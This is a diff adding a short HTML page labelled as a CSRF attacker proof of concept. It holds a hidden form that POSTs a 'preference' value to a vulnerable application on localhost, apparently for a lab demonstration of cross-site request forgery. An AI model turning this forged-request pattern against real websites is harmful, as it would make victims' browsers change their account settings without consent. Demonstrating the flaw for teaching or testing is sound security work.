@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attacker PoC</title>
+</head>
+<body>
+    <h1>CSRF Attacker Demonstration</h1>
+
+    <p>
+        This page demonstrates a forged cross-origin request
+        against the local vulnerable application.
+    </p>
+
+    <form id="csrf-form"
+          action="http://127.0.0.1:8083"
+          method="POST">
+
+        <input type="hidden"
+               name="preference"
+               value="blue">
+
+        <button type="submit">
+            Submit Demonstration Request
+        </button>
+    </form>
+</body>
+</html>
